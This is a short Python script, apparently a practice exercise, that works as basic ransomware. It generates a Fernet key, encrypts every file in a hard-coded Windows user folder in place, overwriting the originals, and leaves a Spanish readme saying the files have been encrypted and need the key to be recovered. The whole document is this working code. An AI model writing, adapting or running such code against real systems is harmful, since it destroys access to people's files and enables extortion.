from cryptography.fernet import Fernet
import os


def generarKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


def retornarkey():
    return open("key.key", "rb").read()


def encryp(items, key):
    i = Fernet(key)
    for x in items:
        with open(x, "rb") as file:
            file_data = file.read()
        data = i.encrypt(file_data)

        with open(x, "wb") as file:
            file.write(data)


if __name__ == "__main__":

    archivos = 'C:\\Users\\gomez\\OneDrive\\Escritorio\\Pruebas'
    items = os.listdir(archivos)
    archivos_2 = [archivos+"\\"+x for x in items]


generarKey()
key = retornarkey()

encryp(archivos_2, key)

with open(archivos+"\\"+"readme.txt", "w") as file:
    file.write("Los archivos han sido incriptados.")
    file.write(" Usar la llave para desincriptarlos")
